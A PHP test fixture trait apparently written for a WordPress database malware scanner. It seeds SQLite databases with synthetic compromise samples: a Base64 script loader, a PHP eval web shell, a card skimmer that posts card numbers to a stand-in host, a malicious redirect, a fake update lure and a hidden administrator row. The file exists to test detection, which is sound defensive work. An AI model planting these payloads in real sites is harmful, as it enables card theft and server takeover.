<?php

namespace Tests\Feature\DbScanner\Concerns;

use App\Models\DbScanConnection;
use App\Models\DbScanMarketRun;
use App\Models\DbScanSetting;
use App\Models\Platform;
use App\Models\User;
use App\Services\DbScanner\Engine\ScanExecutor;
use App\Services\DbScanner\PackSynchronizer;
use App\Services\Ops\LoadShedder;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Str;
use PDO;

/**
 * Disposable single-site WordPress schemas in SQLite files, seeded with
 * synthetic malicious and benign rows (redacted Zimbabwe-incident
 * equivalents — the real snapshot is never used in tests). SQLite certifies
 * engine-agnostic behaviour only; MySQL/MariaDB safety is covered by the
 * opt-in engine suite.
 */
trait BuildsWordPressFixture
{
    protected array $fixtureFiles = [];

    /** @var array<int, string> PDO object id => file */
    protected array $fixturePaths = [];

    protected function bootScanner(): void
    {
        config([
            'db_scanner.enabled' => true,
            'db_scanner.allow_sqlite_fixtures' => true,
            'db_scanner.queue_connection' => 'sync',
            // Production gate behaviour, regardless of a developer's local .env.
            'db_scanner.gates.require_ops_state' => true,
            'db_scanner.gates.require_market_health' => true,
        ]);
        app(PackSynchronizer::class)->sync();
        DbScanSetting::current()->forceFill(['enabled' => true, 'paused' => false, 'emergency_stop' => false])->save();
        $this->freshOpsState();
    }

    protected function freshOpsState(int $level = 0): void
    {
        Cache::put(LoadShedder::STATE_CACHE_KEY, [
            'level' => $level,
            'sampled_at' => now()->toIso8601String(),
            'evaluated_at' => now()->toIso8601String(),
            'enforcement' => false,
        ]);
    }

    protected function tearDownFixtures(): void
    {
        foreach ($this->fixtureFiles as $file) {
            @unlink($file);
        }
    }

    protected function marketPlatform(string $name = 'Zimbabwe', string $domain = 'zim-market.test'): Platform
    {
        return Platform::query()->create([
            'name' => $name,
            'domain' => $domain,
            'country' => $name,
            'currency_code' => 'USD',
            'is_active' => true,
            'timezone' => 'Africa/Harare',
            'health_status' => 'healthy',
            'health_checked_at' => now(),
        ]);
    }

    protected function connectFixture(Platform $platform, string $file, string $prefix = 'wp_', string $hostGroup = 'local'): DbScanConnection
    {
        return DbScanConnection::query()->create([
            'platform_id' => $platform->id,
            'driver' => 'sqlite',
            'database' => $file,
            'username' => 'fixture_reader',
            'password' => 'fixture-secret',
            'prefix' => $prefix,
            'host_group' => $hostGroup,
            'config_version' => 1,
            'enabled' => true,
            'preflight_status' => 'passed',
            'preflight_at' => now(),
            'preflight_config_version' => 1,
            'capabilities' => ['trigger_visibility_exhaustive' => true],
        ]);
    }

    protected function adminUser(string $role = 'admin', array $markets = []): User
    {
        return User::query()->create([
            'name' => ucfirst($role).' '.Str::random(5),
            'email' => Str::random(8).'@example.test',
            'password' => bcrypt('password'),
            'role' => $role,
            'status' => 'active',
            'assigned_market_ids' => $markets,
        ]);
    }

    /**
     * Run every queued slice until no run is waiting (bounded).
     */
    protected function drain(int $maxSlices = 200): void
    {
        $executor = app(ScanExecutor::class);
        for ($i = 0; $i < $maxSlices; $i++) {
            $run = DbScanMarketRun::query()->whereIn('status', ['queued', 'waiting_lock'])->orderBy('id')->first();
            if (! $run) {
                return;
            }
            $executor->runSlice((int) $run->id, (int) $run->generation);
        }
        $this->fail('Scanner did not settle within '.$maxSlices.' slices.');
    }

    protected function newFixture(): PDO
    {
        $file = storage_path('framework/testing/dbscan-'.Str::random(10).'.sqlite');
        if (! is_dir(dirname($file))) {
            mkdir(dirname($file), 0775, true);
        }
        touch($file);
        $this->fixtureFiles[] = $file;
        $pdo = new PDO('sqlite:'.$file);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $this->fixturePaths[spl_object_id($pdo)] = $file;

        return $pdo;
    }

    protected function fixturePath(PDO $pdo): string
    {
        return $this->fixturePaths[spl_object_id($pdo)];
    }

    protected function createWordPressSchema(PDO $pdo, string $p = 'wp_'): void
    {
        $pdo->exec("CREATE TABLE {$p}options (option_id INTEGER PRIMARY KEY AUTOINCREMENT, option_name TEXT UNIQUE, option_value TEXT, autoload TEXT DEFAULT 'yes')");
        $pdo->exec("CREATE TABLE {$p}users (ID INTEGER PRIMARY KEY AUTOINCREMENT, user_login TEXT, user_pass TEXT, user_nicename TEXT, user_email TEXT, user_url TEXT DEFAULT '', user_registered TEXT, user_activation_key TEXT DEFAULT '', user_status INTEGER DEFAULT 0, display_name TEXT)");
        $pdo->exec("CREATE TABLE {$p}usermeta (umeta_id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, meta_key TEXT, meta_value TEXT)");
        $pdo->exec("CREATE TABLE {$p}posts (ID INTEGER PRIMARY KEY AUTOINCREMENT, post_author INTEGER DEFAULT 1, post_date TEXT, post_content TEXT, post_title TEXT, post_excerpt TEXT DEFAULT '', post_status TEXT DEFAULT 'publish', post_name TEXT DEFAULT '', post_parent INTEGER DEFAULT 0, post_type TEXT DEFAULT 'post', post_password TEXT DEFAULT '')");
        $pdo->exec("CREATE TABLE {$p}postmeta (meta_id INTEGER PRIMARY KEY AUTOINCREMENT, post_id INTEGER, meta_key TEXT, meta_value TEXT)");
        $pdo->exec("CREATE TABLE {$p}term_taxonomy (term_taxonomy_id INTEGER PRIMARY KEY AUTOINCREMENT, term_id INTEGER, taxonomy TEXT, description TEXT DEFAULT '', parent INTEGER DEFAULT 0, count INTEGER DEFAULT 0)");
        $pdo->exec("CREATE TABLE {$p}comments (comment_ID INTEGER PRIMARY KEY AUTOINCREMENT, comment_post_ID INTEGER, comment_author_url TEXT DEFAULT '', comment_content TEXT, comment_approved TEXT DEFAULT '1')");
    }

    protected function wpOption(PDO $pdo, string $name, string $value, string $autoload = 'yes', string $p = 'wp_'): int
    {
        $stmt = $pdo->prepare("INSERT INTO {$p}options (option_name, option_value, autoload) VALUES (?, ?, ?)");
        $stmt->execute([$name, $value, $autoload]);

        return (int) $pdo->lastInsertId();
    }

    protected function wpPost(PDO $pdo, string $content, array $extra = [], string $p = 'wp_'): int
    {
        $row = $extra + ['post_title' => 'Post', 'post_type' => 'post', 'post_status' => 'publish', 'post_date' => '2026-01-10 10:00:00', 'post_author' => 1, 'post_parent' => 0];
        $stmt = $pdo->prepare("INSERT INTO {$p}posts (post_author, post_date, post_content, post_title, post_status, post_type, post_parent) VALUES (?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$row['post_author'], $row['post_date'], $content, $row['post_title'], $row['post_status'], $row['post_type'], $row['post_parent']]);

        return (int) $pdo->lastInsertId();
    }

    protected function wpPostmeta(PDO $pdo, int $postId, string $key, string $value, string $p = 'wp_'): int
    {
        $stmt = $pdo->prepare("INSERT INTO {$p}postmeta (post_id, meta_key, meta_value) VALUES (?, ?, ?)");
        $stmt->execute([$postId, $key, $value]);

        return (int) $pdo->lastInsertId();
    }

    protected function wpUser(PDO $pdo, string $login, string $email, string $registered, array $roles = ['administrator' => true], string $p = 'wp_'): int
    {
        $stmt = $pdo->prepare("INSERT INTO {$p}users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([$login, '$P$secret-hash-never-read', $login, $email, $registered, $login]);
        $id = (int) $pdo->lastInsertId();
        $meta = $pdo->prepare("INSERT INTO {$p}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
        $meta->execute([$id, $p.'capabilities', serialize($roles)]);
        $meta->execute([$id, 'session_tokens', 'a:1:{s:64:"SESSIONTOKENSECRET";a:0:{}}']);

        return $id;
    }

    /**
     * The standard malicious/benign market used by most scanner tests.
     *
     * @return array<string, int> named row IDs
     */
    protected function seedCompromisedMarket(PDO $pdo, string $domain = 'zim-market.test'): array
    {
        $this->createWordPressSchema($pdo);
        $ids = [];

        $roles = [
            'administrator' => ['name' => 'Administrator', 'capabilities' => ['manage_options' => true, 'edit_users' => true]],
            'escort' => ['name' => 'Escort', 'capabilities' => ['read' => true]],
            'subscriber' => ['name' => 'Subscriber', 'capabilities' => ['read' => true]],
        ];
        $this->wpOption($pdo, 'siteurl', 'https://'.$domain);
        $this->wpOption($pdo, 'home', 'https://'.$domain);
        $this->wpOption($pdo, 'blog_public', '1');
        $this->wpOption($pdo, 'admin_email', 'ops@exotic-online.com');
        $this->wpOption($pdo, 'users_can_register', '1');
        $this->wpOption($pdo, 'default_role', 'escort');
        $this->wpOption($pdo, 'wp_user_roles', serialize($roles));
        $this->wpOption($pdo, 'template', 'escortwp');
        $this->wpOption($pdo, 'stylesheet', 'escortwp-child');
        $this->wpOption($pdo, 'permalink_structure', '/%postname%/');
        $this->wpOption($pdo, 'active_plugins', serialize(['exotic-crm-sync/exotic-crm-sync.php', 'wordpress-seo/wp-seo.php', 'crawl-page-optimizer/crawl-page-optimizer.php']));
        $this->wpOption($pdo, 'cron', serialize([time() + 3600 => ['wp_version_check' => ['x' => ['schedule' => 'twicedaily', 'args' => []]]], 'version' => 2]));

        // Zimbabwe-style footer widget with a malformed link.
        $ids['widget'] = $this->wpOption($pdo, 'widget_text', serialize([2 => ['title' => 'Footer', 'text' => '<a href="http:/https://exotic-zimbabwe.test/escorts">Escorts</a>'], '_multiwidget' => 1]));
        // Malware-family option name.
        $ids['ioc_option'] = $this->wpOption($pdo, 'default_mont_options', 'a:1:{s:3:"ads";s:4:"none";}');
        // Look-alike autoloaded option holding a Base64 loader.
        $loader = base64_encode('<script>var s=document.createElement("script");s.src="https://cdn-metrics.evil-host.test/l.js";document.head.appendChild(s);</script>');
        $ids['lookalike'] = $this->wpOption($pdo, '_core_version_check_hash', str_repeat('x', 1100).'atob("'.$loader.'")');
        // Header/footer snippet option with an external redirect.
        $ids['snippet_option'] = $this->wpOption($pdo, 'ihaf_insert_header', '<script>if(document.referrer.indexOf("google")>-1){window.location.href="https://scam-landing.test/win";}</script>');
        // Secret-named option holding a script: must never be read.
        $ids['secret'] = $this->wpOption($pdo, 'smtp_password', '<script src="https://should-never-be-read.test/x.js"></script>');
        // Benign: approved analytics and a data-URI image.
        $this->wpOption($pdo, 'theme_mods_escortwp-child', serialize(['header_code' => '<script async src="https://www.google-analytics.com/analytics.js"></script>', 'logo' => 'data:image/png;base64,'.base64_encode(random_bytes(120))]));

        $ids['admin_ok'] = $this->wpUser($pdo, 'ian', 'ian@exotic-online.com', '2024-01-01 00:00:00');
        $ids['admin_bad'] = $this->wpUser($pdo, 'support_admin', 'support_admin@wordpress.com', '2023-01-01 00:00:00');
        $ids['member'] = $this->wpUser($pdo, 'member1', 'member@gmail.com', '2025-02-01 00:00:00', ['escort' => true]);
        // Hidden administrator under a foreign capability key.
        $stmt = $pdo->prepare('INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)');
        $stmt->execute([$ids['member'], 'wp9_capabilities', serialize(['administrator' => true])]);
        $ids['hidden_meta'] = (int) $pdo->lastInsertId();

        // Web shell in a non-public post type.
        $ids['webshell'] = $this->wpPost($pdo, '<?php if(isset($_POST["c"])){ eval(base64_decode($_POST["c"])); } ?>', ['post_type' => 'oembed_fake', 'post_status' => 'draft', 'post_title' => 'cache']);
        // External script in public content.
        $ids['external_script'] = $this->wpPost($pdo, '<p>Hello</p><script src="https://evil-cdn.test/inject.js"></script>');
        // Benign profile with YouTube iframe, approved analytics and accessibility helper.
        $ids['benign'] = $this->wpPost($pdo, '<p>Nairobi profile</p><iframe src="https://www.youtube.com/embed/abc"></iframe><span class="screen-reader-text">Skip</span>', ['post_type' => 'escort']);
        // CJK SEO spam.
        $ids['cjk'] = $this->wpPost($pdo, '<p>外围 上门 服务 微信 同步 联系 外围女 学生</p>', ['post_title' => 'Spam']);
        // Fake browser update overlay.
        $ids['fake_update'] = $this->wpPost($pdo, '<div style="position:fixed">Update your browser to continue <a href="https://bad.test/update.exe">Download</a></div>');

        $ids['seo_meta'] = $this->wpPostmeta($pdo, $ids['benign'], '_yoast_wpseo_title', 'Best escorts <a href="https://spam-links.test">cheap</a>');
        $ids['card_skimmer'] = $this->wpPostmeta($pdo, $ids['benign'], '_elementor_custom_code', json_encode(['code' => '<script>document.querySelector("input[name=cardnumber]").addEventListener("blur",function(e){fetch("https://skim.evil.test/c",{method:"POST",body:e.target.value})})</script>']));

        $stmt = $pdo->prepare('INSERT INTO wp_term_taxonomy (term_id, taxonomy, description) VALUES (?, ?, ?)');
        $stmt->execute([1, 'category', '<div style="display:none"><a href="https://casino-spam.test">casino</a></div>']);
        $ids['hidden_term'] = (int) $pdo->lastInsertId();

        // A persistence trigger.
        $pdo->exec("CREATE TRIGGER wds_protect_7_before_update BEFORE UPDATE ON wp_posts BEGIN SELECT RAISE(ABORT, 'protected'); END");

        return $ids;
    }
}
